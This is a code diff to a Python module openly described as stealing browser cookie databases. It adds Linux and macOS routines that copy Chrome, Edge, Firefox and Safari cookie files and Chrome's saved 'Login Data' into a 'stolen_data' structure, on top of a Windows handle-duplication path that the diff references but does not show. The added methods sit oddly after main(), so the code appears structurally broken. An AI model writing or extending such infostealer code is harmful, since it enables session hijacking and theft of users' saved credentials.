@@ -9,80 +9,110 @@ This module steals browser cookie databases by duplicating handles from browser 
 
 import os
 import sys
-import ctypes
-from ctypes import wintypes, c_char_p, c_wchar_p, c_void_p, POINTER, Structure
+import platform
 import psutil
 import shutil
 from pathlib import Path
+
+# Platform-specific imports
+if platform.system() == "Windows":
+    import ctypes
+    from ctypes import wintypes, c_char_p, c_wchar_p, c_void_p, POINTER, Structure
+else:
+    import fcntl
+    import mmap
+    # Define dummy Structure for non-Windows platforms
+    class Structure:
+        _fields_ = []
 
 class HandleStealer:
     """Steal browser cookie databases using handle duplication"""
     
     def __init__(self):
-        self.kernel32 = ctypes.windll.kernel32
-        self.ntdll = ctypes.windll.ntdll
-        self.shell32 = ctypes.windll.shell32
+        self.platform = platform.system()
+        if self.platform == "Windows":
+            self.kernel32 = ctypes.windll.kernel32
+            self.ntdll = ctypes.windll.ntdll
+            self.shell32 = ctypes.windll.shell32
+        else:
+            # Linux/macOS specific initialization
+            self.proc_fd = None
         
-        # Define structures
-        class PROCESS_BASIC_INFORMATION(Structure):
-            _fields_ = [
-                ("Reserved1", ctypes.c_void_p),
-                ("PebBaseAddress", ctypes.c_void_p),
-                ("Reserved2", ctypes.c_void_p * 2),
-                ("UniqueProcessId", ctypes.c_void_p),
-                ("Reserved3", ctypes.c_void_p)
-            ]
+        # Define structures (Windows only)
+        if self.platform == "Windows":
+            class PROCESS_BASIC_INFORMATION(Structure):
+                _fields_ = [
+                    ("Reserved1", ctypes.c_void_p),
+                    ("PebBaseAddress", ctypes.c_void_p),
+                    ("Reserved2", ctypes.c_void_p * 2),
+                    ("UniqueProcessId", ctypes.c_void_p),
+                    ("Reserved3", ctypes.c_void_p)
+                ]
+        else:
+            class PROCESS_BASIC_INFORMATION(Structure):
+                _fields_ = []
         
-        class PEB(Structure):
-            _fields_ = [
-                ("Reserved1", ctypes.c_ubyte * 2),
-                ("BeingDebugged", ctypes.c_ubyte),
-                ("Reserved2", ctypes.c_ubyte),
-                ("Reserved3", ctypes.c_void_p * 2),
-                ("Ldr", ctypes.c_void_p),
-                ("ProcessParameters", ctypes.c_void_p),
-                ("Reserved4", ctypes.c_void_p * 3),
-                ("AtlThunkSListPtr", ctypes.c_void_p),
-                ("Reserved5", ctypes.c_void_p),
-                ("Reserved6", ctypes.c_ulong),
-                ("Reserved7", ctypes.c_void_p),
-                ("Reserved8", ctypes.c_ulong),
-                ("AtlThunkSListPtr32", ctypes.c_ulong),
-                ("Reserved9", ctypes.c_void_p * 45),
-                ("PostProcessInitRoutine", ctypes.c_void_p),
-                ("Reserved10", ctypes.c_ubyte * 128),
-                ("Reserved11", ctypes.c_void_p * 1),
-                ("SessionId", ctypes.c_ulong)
-            ]
+        if self.platform == "Windows":
+            class PEB(Structure):
+                _fields_ = [
+                    ("Reserved1", ctypes.c_ubyte * 2),
+                    ("BeingDebugged", ctypes.c_ubyte),
+                    ("Reserved2", ctypes.c_ubyte),
+                    ("Reserved3", ctypes.c_void_p * 2),
+                    ("Ldr", ctypes.c_void_p),
+                    ("ProcessParameters", ctypes.c_void_p),
+                    ("Reserved4", ctypes.c_void_p * 3),
+                    ("AtlThunkSListPtr", ctypes.c_void_p),
+                    ("Reserved5", ctypes.c_void_p),
+                    ("Reserved6", ctypes.c_ulong),
+                    ("Reserved7", ctypes.c_void_p),
+                    ("Reserved8", ctypes.c_ulong),
+                    ("AtlThunkSListPtr32", ctypes.c_ulong),
+                    ("Reserved9", ctypes.c_void_p * 45),
+                    ("PostProcessInitRoutine", ctypes.c_void_p),
+                    ("Reserved10", ctypes.c_ubyte * 128),
+                    ("Reserved11", ctypes.c_void_p * 1),
+                    ("SessionId", ctypes.c_ulong)
+                ]
+            
+            class RTL_USER_PROCESS_PARAMETERS(Structure):
+                _fields_ = [
+                    ("MaximumLength", ctypes.c_ulong),
+                    ("Length", ctypes.c_ulong),
+                    ("Flags", ctypes.c_ulong),
+                    ("DebugFlags", ctypes.c_ulong),
+                    ("ConsoleHandle", ctypes.c_void_p),
+                    ("ConsoleFlags", ctypes.c_ulong),
+                    ("StandardInput", ctypes.c_void_p),
+                    ("StandardOutput", ctypes.c_void_p),
+                    ("StandardError", ctypes.c_void_p),
+                    ("CurrentDirectory", ctypes.c_void_p),
+                    ("DllPath", ctypes.c_void_p),
+                    ("ImagePathName", ctypes.c_void_p),
+                    ("CommandLine", ctypes.c_void_p)
+                ]
+            
+            class UNICODE_STRING(Structure):
+                _fields_ = [
+                    ("Length", ctypes.c_ushort),
+                    ("MaximumLength", ctypes.c_ushort),
+                    ("Buffer", ctypes.c_void_p)
+                ]
+        else:
+            class PEB(Structure):
+                _fields_ = []
+            
+            class RTL_USER_PROCESS_PARAMETERS(Structure):
+                _fields_ = []
+            
+            class UNICODE_STRING(Structure):
+                _fields_ = []
         
-        class RTL_USER_PROCESS_PARAMETERS(Structure):
-            _fields_ = [
-                ("MaximumLength", ctypes.c_ulong),
-                ("Length", ctypes.c_ulong),
-                ("Flags", ctypes.c_ulong),
-                ("DebugFlags", ctypes.c_ulong),
-                ("ConsoleHandle", ctypes.c_void_p),
-                ("ConsoleFlags", ctypes.c_ulong),
-                ("StandardInput", ctypes.c_void_p),
-                ("StandardOutput", ctypes.c_void_p),
-                ("StandardError", ctypes.c_void_p),
-                ("CurrentDirectory", ctypes.c_void_p),
-                ("DllPath", ctypes.c_void_p),
-                ("ImagePathName", ctypes.c_void_p),
-                ("CommandLine", ctypes.c_void_p)
-            ]
-        
-        class UNICODE_STRING(Structure):
-            _fields_ = [
-                ("Length", ctypes.c_ushort),
-                ("MaximumLength", ctypes.c_ushort),
-                ("Buffer", ctypes.c_void_p)
-            ]
-        
-        self.PROCESS_BASIC_INFORMATION = PROCESS_BASIC_INFORMATION
-        self.PEB = PEB
-        self.RTL_USER_PROCESS_PARAMETERS = RTL_USER_PROCESS_PARAMETERS
-        self.UNICODE_STRING = UNICODE_STRING
+        if self.platform == "Windows":
+            self.PROCESS_BASIC_INFORMATION = PROCESS_BASIC_INFORMATION
+            self.PEB = PEB
+            self.RTL_USER_PROCESS_PARAMETERS = RTL_USER_PROCESS_PARAMETERS
+            self.UNICODE_STRING = UNICODE_STRING
     
     def is_network_service(self, pid):
         """Check if process is NetworkService"""
@@ -254,6 +284,72 @@ def main():
             
     except Exception as e:
         print(f"Error: {e}")
+
+    def steal_cookie_database(self, pid, browser_type):
+        """Steal cookie database from browser process"""
+        try:
+            if self.platform == "Windows":
+                # Windows implementation
+                return self.copy_database_brute_force_handle_by_pid(pid)
+            else:
+                # Linux/macOS implementation
+                return self._steal_cookie_database_unix(pid, browser_type)
+            
+        except Exception as e:
+            print(f"Error stealing cookie database: {e}")
+            return None
+    
+    def _steal_cookie_database_unix(self, pid, browser_type):
+        """Linux/macOS specific cookie database extraction"""
+        try:
+            # Get browser data paths
+            browser_paths = self._get_browser_paths_unix(browser_type)
+            
+            stolen_data = {}
+            
+            for path_type, path in browser_paths.items():
+                if os.path.exists(path):
+                    try:
+                        # Copy file to temporary location
+                        temp_path = f"/tmp/stolen_{path_type}_{pid}"
+                        shutil.copy2(path, temp_path)
+                        
+                        # Read file content
+                        with open(temp_path, 'rb') as f:
+                            content = f.read()
+                        
+                        stolen_data[path_type] = {
+                            'path': path,
+                            'content': content,
+                            'size': len(content)
+                        }
+                        
+                        # Clean up
+                        os.remove(temp_path)
+                        
+                    except Exception as e:
+                        print(f"Error accessing {path}: {e}")
+            
+            return stolen_data
+            
+        except Exception as e:
+            print(f"Error in Unix cookie extraction: {e}")
+            return None
+    
+    def _get_browser_paths_unix(self, browser_type):
+        """Get browser data paths for Unix systems"""
+        home = os.path.expanduser("~")
+        
+        paths = {
+            'chrome_cookies': f"{home}/.config/google-chrome/Default/Cookies",
+            'chrome_login': f"{home}/.config/google-chrome/Default/Login Data",
+            'firefox_profile': f"{home}/.mozilla/firefox",
+            'edge_cookies': f"{home}/.config/microsoft-edge/Default/Cookies",
+            'safari_cookies': f"{home}/Library/Cookies/Cookies.binarycookies" if self.platform == "Darwin" else None
+        }
+        
+        # Filter out None values
+        return {k: v for k, v in paths.items() if v is not None}
 
 if __name__ == "__main__":
     main()
